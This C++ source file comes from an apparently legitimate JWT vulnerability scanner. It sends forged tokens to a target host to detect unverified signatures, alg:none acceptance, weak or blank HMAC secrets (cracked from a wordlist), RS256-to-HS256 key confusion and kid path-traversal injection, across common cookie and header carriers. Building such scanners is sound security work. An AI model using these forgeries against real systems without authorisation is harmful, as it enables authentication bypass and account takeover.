#include "jwt_probe.hpp"
#include "jwt_tool.hpp"
#include "networking.hpp"

#include <QJsonObject>

namespace Nullock::Core::JwtProbe {

// The pure forgery/request builders (buildRequest, corruptSignature,
// algNoneVariants, isCredentialHeader, defaultSecrets) live in
// jwt_probe_logic.cpp so they can be unit-tested against Qt6::Core alone. This
// TU keeps testOneCarrier()/test(), which pull in HttpClient (the Qt6::Network
// chain) and are therefore I/O.

static Result testOneCarrier(const Request &req) {
    Result result;
    if (req.host.isEmpty())  { result.error = "host required"; return result; }
    if (req.token.isEmpty()) { result.error = "a captured JWT is required"; return result; }

    const JwtTool::Decoded d = JwtTool::decode(req.token);
    if (!d.ok) { result.error = "could not decode token: " + d.error; return result; }

    HttpClient client;
    const quint16 port = static_cast<quint16>(req.port);
    Request r = req;
    if (r.basePath.isEmpty()) r.basePath = QStringLiteral("/");
    if (r.method.isEmpty())   r.method = QStringLiteral("GET");
    // Each response is (status, body length) so acceptance can be content-aware
    // -- a generic/cached 200 that differs from the real authorized page is not
    // mistaken for acceptance.
    struct Resp { int status; int len; };
    auto send = [&](const QString &token) -> Resp {
        const QByteArray bytes = buildRequest(r, token);
        if (bytes.isEmpty()) return { -1, -1 };
        ++result.requestsSent;
        const auto res = client.send(r.host, port, r.tls, bytes);
        return res.ok ? Resp{ res.parsed.statusCode, static_cast<int>(res.parsed.body.size()) }
                      : Resp{ -1, -1 };
    };

    // Calibration: no-token must be a REAL response distinct from the valid
    // token's (so the endpoint actually authenticates) -- distinct in status OR
    // body, so body-only auth gates still calibrate. A dropped (-1) probe fails.
    const Resp noAuth = send(QString());
    const Resp valid  = send(req.token);
    const Resp reject = send(corruptSignature(req.token));     // a FORGED-and-(usually)-rejected page
    result.authStatus   = valid.status;
    result.rejectStatus = reject.status;                       // doc-aligned: the corrupted-token status
    const bool authOk = valid.status >= 200 && valid.status < 400;
    const bool gates  = noAuth.status >= 0
        && (noAuth.status != valid.status || noAuth.len != valid.len);
    // Calibration needs a real no-token baseline and a real authorized response;
    // the corrupt-signature probe is NOT required here. If a WAF transport-drops
    // the tampered token (reject.status == -1) the endpoint is still calibrated --
    // we just have no usable forged-rejection baseline, so the sig-not-verified
    // class self-skips below (rejectHasBaseline) while the other attack classes,
    // which forge DIFFERENT tokens, still run.
    result.calibrated = authOk && gates;
    if (!result.calibrated) {
        result.error = (valid.status < 0 || noAuth.status < 0)
            ? "baseline request failed (transport error)"
            : QString("inconclusive: endpoint isn't auth-gated or the token isn't valid "
                      "(no-token status %1, valid-token status %2)")
                  .arg(noAuth.status).arg(valid.status);
        return result;
    }
    const bool rejectHasBaseline = reject.status >= 0;

    // A forgery is accepted iff its response looks like the VALID baseline: same
    // status AND (for body-only gates) the body length STRICTLY closer to valid
    // than to a REJECTED baseline. The reject baseline is the FORGED (signature-
    // corrupted) page, NOT the bare no-credential page -- a server that rejects a
    // bad signature renders an "invalid token" page that is often sized very
    // differently from the "no credential" page, and the old code compared
    // against the no-token page, so a forged-rejection page sized near valid
    // false-accepted every forgery. Comparing against the actual forged-rejection
    // page closes that. Strict '<' so an exact midpoint no longer auto-accepts.
    auto looksValid = [&](const Resp &x, const Resp &rej) -> bool {
        if (x.status != valid.status) return false;
        // If the rejected baseline has a DIFFERENT status, a forgery that returns
        // the authorized status is already distinguished -- no body tiebreak
        // needed (and the reject page's length, from a different status, isn't a
        // meaningful 200-vs-200 reference). Only when valid and reject share a
        // status (a body-only gate) does the length decide.
        if (valid.status != rej.status) return true;
        return qAbs(x.len - valid.len) < qAbs(x.len - rej.len);
    };
    // If the corrupt token ITSELF reads as valid, the server doesn't verify the
    // signature -- then it can't serve as the reject baseline, so the other
    // attack classes fall back to the no-token page. (The sig-not-verified class
    // below detects exactly this case.)
    //
    // For a body-only gate this must be an ABSOLUTE proximity test, NOT just
    // "closer to valid than to noAuth": a server that genuinely REJECTS the
    // forgery often renders a verbose "invalid token" page whose length lands
    // past the valid<->noAuth midpoint (i.e. nearer valid) without resembling the
    // authorized page at all. Treating that as corruptAccepted re-points the
    // reject baseline at noAuth and makes sig-not-verified fire on a server that
    // actually rejects bad signatures (the headline FP). So only call the corrupt
    // page "accepted" when its length sits in valid's immediate neighborhood.
    // A server that does NOT verify the signature serves the corrupt token from
    // the SAME authorized handler, so its page is essentially identical to valid;
    // require the corrupt length within 1/8 of the valid<->noAuth span of valid.
    // (A verbose "invalid token" reject page sized merely past the midpoint is
    // well outside this neighborhood and is no longer mistaken for acceptance.)
    auto looksLikeValidBody = [&](const Resp &x) -> bool {
        if (x.status != valid.status) return false;
        const int span = qAbs(valid.len - noAuth.len);
        return span == 0 ? x.len == valid.len
                         : qAbs(x.len - valid.len) * 8 <= span;   // <= 12.5% of the span
    };
    // When valid and the corrupt page differ in STATUS, status alone settles it
    // (no body neighborhood needed); otherwise require the absolute neighborhood.
    // If the corrupt probe was dropped (no baseline) we can't judge acceptance of
    // the corrupt page, and the reject baseline falls back to the no-token page.
    const bool corruptAccepted = rejectHasBaseline
        && ((valid.status != noAuth.status) ? looksValid(reject, noAuth)
                                            : looksLikeValidBody(reject));
    const Resp rejectBaseline = (corruptAccepted || !rejectHasBaseline) ? noAuth : reject;
    auto accepted = [&](const Resp &x) -> bool { return looksValid(x, rejectBaseline); };
    auto acceptedStably = [&](const QString &token) -> bool {
        if (!accepted(send(token))) return false;
        return accepted(send(token));
    };

    // All three attack classes are independent -- run each regardless of the
    // others so a server with multiple flaws reports them all.

    // 1) signature not verified: a token with a genuinely-invalid signature is
    //    still accepted. (corruptSignature flips a real signature byte.) Only when
    //    the corrupt probe actually transported -- otherwise we have no baseline
    //    for this class and firing against the no-token page would re-introduce
    //    the old false positive.
    if (rejectHasBaseline && acceptedStably(corruptSignature(req.token))) {
        result.hits.append({ "signature-not-verified", "jwt-signature-not-verified",
            "the server accepted a token whose signature is invalid -- the JWT "
            "signature is not verified", corruptSignature(req.token) });
        result.vulnerable = true;
    }

    // 2) alg:none (and case/empty/absent variants).
    for (const QString &variant : algNoneVariants(d)) {
        if (acceptedStably(variant)) {
            result.hits.append({ "alg-none", "jwt-alg-none",
                "the server accepted an alg:none token (signature stripped) as valid",
                variant });
            result.vulnerable = true;
            break;
        }
    }

    // 3) weak HMAC secret: crack it, re-sign a tampered claim.
    if (d.alg.startsWith("HS", Qt::CaseInsensitive)) {
        const QStringList list = req.secretWordlist.isEmpty()
            ? defaultSecrets() : req.secretWordlist;
        const QString secret = JwtTool::bruteHmac(d, list);
        if (!secret.isEmpty()) {
            QJsonObject p = d.payload;
            p.insert(QStringLiteral("nlk"), QStringLiteral("1"));
            const QString forged = JwtTool::signHmac(d.header, p, secret.toUtf8());
            if (!forged.isEmpty() && acceptedStably(forged)) {
                result.hits.append({ "weak-secret", "jwt-weak-secret",
                    "the HS256 secret is weak (\"" + secret + "\"); a re-signed token "
                    "with a tampered claim was accepted", forged });
                result.vulnerable = true;
            }
        }
    }

    // 4) RS256->HS256 algorithm confusion: re-sign the token as HS256 using the
    //    server's PUBLIC KEY bytes as the HMAC secret. A server that verifies
    //    with the public key regardless of the alg header accepts it.
    const QString algLow = d.alg.toLower();
    const bool asymmetric = algLow.startsWith("rs") || algLow.startsWith("es")
                         || algLow.startsWith("ps");
    bool algConfusionUntested = false;
    if (asymmetric && req.publicKeyPem.isEmpty()) {
        algConfusionUntested = true;
    } else if (asymmetric) {
        QJsonObject h = d.header;  h["alg"] = "HS256";
        QJsonObject p = d.payload; p.insert(QStringLiteral("nlk"), QStringLiteral("1"));
        // Servers differ in the exact key bytes they verify with; try a few forms.
        const QStringList keys = { req.publicKeyPem, req.publicKeyPem.trimmed(),
                                   req.publicKeyPem.trimmed() + "\n" };
        for (const QString &k : keys) {
            const QString forged = JwtTool::signHmac(h, p, k.toUtf8());
            if (!forged.isEmpty() && acceptedStably(forged)) {
                result.hits.append({ "alg-confusion", "jwt-alg-confusion",
                    "the server accepted an HS256 token re-signed with its own public-key "
                    "bytes -- RS256->HS256 algorithm confusion", forged });
                result.vulnerable = true;
                break;
            }
        }
    }

    // Classes 5 & 6 (empty-key forgeries) are SOUND only when the server actually
    // VERIFIES the signature -- i.e. the corrupt-signature token was REJECTED. If
    // the server ignores the signature entirely (corruptAccepted), an empty-key /
    // kid forgery is accepted for THAT reason, which class 1 (signature-not-
    // verified) already reports; firing blank-secret/kid here would assert a false
    // mechanism (the key isn't blank, and kid was never resolved). So gate on it.
    if (!corruptAccepted) {
        // 5) blank HMAC secret: an HS256/384/512 token signed with an EMPTY key. A
        //    server with an unset/blank signing secret verifies it. Distinct from
        //    the weak-secret dictionary crack (the empty string isn't a wordlist
        //    entry); runs for ANY captured token (an RS/ES server may HMAC-fall-back).
        bool blankAccepted = false;
        for (const QString &forged : blankSecretVariants(d)) {
            if (!forged.isEmpty() && acceptedStably(forged)) {
                result.hits.append({ "blank-secret", "jwt-blank-secret",
                    "the server accepted an HMAC token signed with an EMPTY secret -- the "
                    "JWT signing key is blank/unset", forged });
                result.vulnerable = true;
                blankAccepted = true;
                break;
            }
        }

        // 6) kid header injection -- DIFFERENTIAL: a malicious `kid` (path traversal
        //    to an empty file such as /dev/null) steers the server's key lookup at
        //    empty-key bytes. This is only sound when the bare empty-key token (no
        //    kid) is REJECTED but a kid variant is ACCEPTED -- that isolates "empty
        //    key reached VIA the kid-controlled file lookup" from "the configured
        //    secret is simply blank" (class 5, which shares the empty key). If the
        //    no-kid blank-secret token already passed, the empty key -- not kid --
        //    explains acceptance, so the kid mechanism is unproven; don't claim it.
        if (!blankAccepted) {
            for (const QString &forged : kidInjectionVariants(d)) {
                if (!forged.isEmpty() && acceptedStably(forged)) {
                    result.hits.append({ "kid-injection", "jwt-kid-injection",
                        "the server accepted a token whose `kid` points its key lookup at an "
                        "empty/predictable file (e.g. /dev/null) and then HMAC-verified with "
                        "the empty key the attacker also used, while the same empty-key token "
                        "WITHOUT the kid was rejected -- kid path-traversal key injection",
                        forged });
                    result.vulnerable = true;
                    break;
                }
            }
        }
    }

    // Surface the gap when an asymmetric token couldn't be tested for confusion
    // and nothing else fired (so a clean result isn't mistaken for fully tested).
    if (algConfusionUntested && !result.vulnerable && result.error.isEmpty())
        result.error = "asymmetric token: RS256->HS256 algorithm confusion not tested "
                       "(supply the server public key via publicKey)";

    return result;
}

Result test(const Request &req) {
    auto label = [](const QString &loc) {
        return loc.isEmpty() ? QStringLiteral("Authorization: Bearer") : loc;
    };
    // Explicit carrier -> test just that one.
    if (!req.location.isEmpty()) {
        Result r = testOneCarrier(req);
        for (Hit &h : r.hits) h.carrier = label(req.location);
        return r;
    }
    // No carrier given -> fan out across the common JWT carriers. Only the one
    // the server actually reads will calibrate (no-token vs valid differ); the
    // rest self-skip as inconclusive, so this can't manufacture false positives.
    static const char *kCarriers[] = {
        "", "cookie:token", "cookie:jwt", "cookie:access_token", "cookie:auth",
        "cookie:session", "cookie:remember-me", "cookie:remember_token",
        "header:X-Auth-Token", "header:X-Access-Token",
    };
    Result agg;
    bool anyCalibrated = false;
    for (const char *c : kCarriers) {
        Request rc = req;
        rc.location = QString::fromLatin1(c);
        const Result r = testOneCarrier(rc);
        agg.requestsSent += r.requestsSent;
        if (!r.calibrated) continue;
        anyCalibrated = true;
        if (agg.authStatus == 0) { agg.authStatus = r.authStatus; agg.rejectStatus = r.rejectStatus; }
        for (Hit h : r.hits) { h.carrier = label(rc.location); agg.hits.append(h); }
        if (r.vulnerable) agg.vulnerable = true;
    }
    agg.calibrated = anyCalibrated;
    if (!anyCalibrated)
        agg.error = "inconclusive: no token carrier (Authorization: Bearer, common "
                    "cookies, or X-Auth-Token/X-Access-Token) was auth-gated with this token";
    return agg;
}

} // namespace Nullock::Core::JwtProbe
